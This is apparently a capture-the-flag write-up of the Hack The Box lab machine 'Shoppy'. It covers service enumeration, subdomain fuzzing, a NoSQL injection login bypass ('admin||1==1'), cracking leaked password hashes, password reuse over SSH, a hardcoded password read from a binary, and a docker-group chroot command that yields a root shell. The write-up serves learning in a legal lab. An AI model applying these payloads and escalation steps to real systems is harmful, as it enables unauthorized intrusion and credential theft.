# Intelligence Gathering

Letâ€™s kick it with NMAP to see which services are up and running on this server

```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Letâ€™s get more information about the service versions on this server

```bash
PORT     STATE SERVICE  REASON         VERSION

# Enumeration

### Web Enumeration

This is how the website looks, so far

![Untitled](/Assets/Pictures/Shoppy/Untitled.png)

Next, letâ€™s look at the source code of this beautiful page

letâ€™s see different directories sitting under the server, using dirsearch

```bash
Target: http://shoppy.htb/

[05:12:07] 200 -    1KB - /login/

Task Completed
```

letâ€™s take a look at the login page, after a trying to brute force the login panel nothing came out, time to move on and look for any subdomain

![Untitled](/Assets/Pictures/Shoppy/Untitled%201.png)

Letâ€™s use FFUF(Fuzz Faster U Fool), one of the best tool out there.

```bash
:: Method           : GET
 :: URL              : http://shoppy.htb
 :: Wordlist         : FUZZ: /home/retr0x01/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt

:: Progress: [100000/100000]Â :: Job [1/1] :: 584 req/sec :: Duration: [0:02:51] :: Errors: 0 ::
```

We found a subdomain, letâ€™s add it to our host file and access the page

the entry on our host now looks like this 

`10.10.11.180 Â Â Â shoppy.htb Â Â Â mattermost.shoppy.htb`

and here is the webpage of mattermost subdomain

![Untitled](/Assets/Pictures/Shoppy/Untitled%202.png)

Another log in panelâ€¦letâ€™s look at the source and see whatâ€™s going on

There too there was nothing interestingâ€¦now that we are stuck letâ€™s go back to everything we did so far

# Foothold

While bruteforcing, we tried to run the log in information using sqlmap at some point without trying some other payload for instance here we have a blind sql injection since the error message does not display any sql statement just a plain wrong pasword message. Knowing that  [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads) got some nice NoSQL injection payload to bypass authentication. 

We will first try with the admin panel and if there is still nothing we will try with the mattermost subdomain.

Here is a proof of the NoSQLi attack

![Untitled](/Assets/Pictures/Shoppy/Untitled%203.png)

Setting that cookie to our browser, we are logged in as admin on the server. Here is how it looks

![Untitled](/Assets/Pictures/Shoppy/Untitled%204.png)

Nothing much to see expect a search bar, where we can search users. admin the current user was the only one we could search for now. Surpisingly by doing so, it helps us export some data 

![Untitled](/Assets/Pictures/Shoppy/Untitled%205.png)

Here now once itâ€™s fetch, we can see an export button appear

![Untitled](/Assets/Pictures/Shoppy/Untitled%206.png)

And export the download disclose some sensitive data such as the user id and the password

```json
[
	{
			"_id":"62db0e93d6d6a999a66ee67a",
			"username":"admin",
			"password":"23c6877d9e2b564ef8b32c3a23de27b2"
	}
]
```

Letâ€™s see if we can get more or other users. we tried with the same payload we used to bypass the login `admin||1==1` 

```json
[
	{
			"_id":"62db0e93d6d6a999a66ee67a",
			"username":"admin",
			"password":"23c6877d9e2b564ef8b32c3a23de27b2"
	},
	{
			"_id":"62db0e93d6d6a999a66ee67b",
			"username":"josh",
			"password":"6ebcea65320589ca4f2f1ce039975995"
	}
]
```

Finally we got another user named josh and his hashed password

Letâ€™s crack these hashes using [crackstation.net](https://crackstation.net/)! 

![Untitled](/Assets/Pictures/Shoppy/Untitled%207.png)

Only joshâ€™s password was cracked at this point

Now we can use those creds to log into the subdomain we found earlier

# User

Here we logged in using joshâ€™s credentials and we have one foot on the door ðŸ˜€

![Untitled](/Assets/Pictures/Shoppy/Untitled%208.png)

So mattermost subdomain is more of a chat channel, where workers can exchange inside an organization just like slack or microsoft teams. Inside, we found more users such as `jess and jaeger`. While enumerating we found more creds

![Untitled](/Assets/Pictures/Shoppy/Untitled%209.png)

Now we got the CEOâ€™s password too from the deploy machine sidebar. We have tried josh password for ssh connection but it did not work, letâ€™s try password reuse on the server with the CEOâ€™s password given here

and there was the sshâ€™s password

```bash
âžœ  ssh jaeger@shoppy.htb -o UserKnownHostsFile=/dev/null

Warning: Permanently added 'shoppy.htb' (ED25519) to the list of known hosts.
jaeger@shoppy.htb's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

jaeger@shoppy:~$ whoami; hostname -I
jaeger
10.10.11.180 172.17.0.1 dead:beef::250:56ff:feb9:621e
```

Letâ€™s enumerate the system now to look for the path to privilege escalation

# Privilege Escalation

First thing first is to see, what command the current user can run as root by running `sudo -l`

```bash
sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

jaeger can run `/home/deploy/password-manager` without using a password as deploy not root, letâ€™s investigate this file to see whatâ€™s the binary about

being in another userâ€™s home folder, letâ€™s look at the access we got to the files in the folder

```bash
jaeger@shoppy:/home/deploy$ ls -l
total 28
-rw------- 1 deploy deploy    56 Jul 22 13:15 creds.txt
-rwxr--r-- 1 deploy deploy 18440 Jul 22 13:20 password-manager
-rw------- 1 deploy deploy   739 Feb  1  2022 password-manager.cpp
```

For now we can only read the password-manager file and run it as deploy

```bash
jaeger@shoppy:/home/deploy$ file password-manager
password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.
0, not stripped
```

So using strings we could not get anything, but while trying to execute it, we understand the flow of the binary. That helped when it came to read the file with `less/cat`

```bash
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: testing
Access denied! This incident will be reported !
```

So the binary asks for a password in order to grant access to the password-manager. Seing this was important because we understand the flow of the binary. Now while reading the file we notice something, that when we will try it will surprise us. but it made sense since we knew the flow. There is a password disclosure inside the binary

```bash
jaeger@shoppy:/home/deploy$ cat password-manager
[SNIP]
H]UHH}u}u2}u)H=.Hu,H5.H+H/UH]AWL=W)AVIAUIATAUH-P)SL)HtLLDAHH9u[]A\A]A^A_Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !
```

Here is the password, since when we tried earlier, after entering the password a message is displayed to tell us if we got it or not. So if we have the right one, we get a Access granted message shown to us. so thatâ€™s why we believed Sample is the password needed to access password-manager

Letâ€™s try it out and see

```bash
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

There we got the user deploy credentials. Time to ssh and pivot as deploy now

```bash
âžœ  ssh deploy@shoppy.htb                              
The authenticity of host 'shoppy.htb (10.10.11.180)' can't be established.

$ whoami; hostname
deploy
shoppy
```

We still are not the root user yet, so letâ€™s enumerate the box for more attack vector

`sudo -l` did not work for deploy. Another command for me is to look for SUID or sticky bit

with the following `find / -perm -u=s -type f 2>/dev/null`

Unfortunately, nothing came up with these comments. In that case we went back to the enumeration again before uploading any other tool

while reading the notes we found this information disclosure on the chat between jaeger and josh

![Untitled](/Assets/Pictures/Shoppy/Untitled%2010.png)

we can verify this statement with the id command to see the groups the user belong to

```bash
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

So we know now that the deploy user on shoppy has been created using docker. According to [GTFObins](https://gtfobins.github.io/gtfobins/docker/#sudo) we can exploit docker for privilege escaltion.

According to the doc, running `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh` should give us a root shell

Letâ€™s try, at first it did not workâ€¦we need to adjust the command to our type of shell so instead of running it with as root we will need to run it without being root, since deploy is not in the sudoers file

```bash
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id;whoami
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
root
```

With this we can get the root flag, and voila ! we are done

Happy Hacking !
